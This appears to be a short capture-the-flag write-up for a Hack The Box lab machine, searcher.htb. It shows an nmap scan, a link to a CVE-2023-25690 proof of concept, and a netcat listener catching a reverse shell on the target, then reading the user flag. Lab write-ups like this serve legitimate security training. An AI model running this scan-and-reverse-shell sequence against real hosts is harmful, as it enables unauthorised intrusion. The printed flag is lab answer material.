└──╼ [★]$ nmap -sC -A -T4 -Pn 10.129.151.159
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 20:06 BST
Nmap scan report for 10.129.151.159
Host is up (0.067s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.16 seconds


https://github.com/dhmosfunk/CVE-2023-25690-POC



![image](https://github.com/Rogue-1/HTB/assets/105310322/3a775ef7-e6e8-44e4-b396-aaef44ed2d4f)


└──╼ [★]$ nc -lvnp 9999
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
id
Ncat: Connection from 10.129.151.159.
Ncat: Connection from 10.129.151.159:53744.
/bin/sh: 0: can't access tty; job control turned off
$ uid=1000(svc) gid=1000(svc) groups=1000(svc)

$ cat user.txt
e20a5ccbdad3cce7edff4b74ff13f303

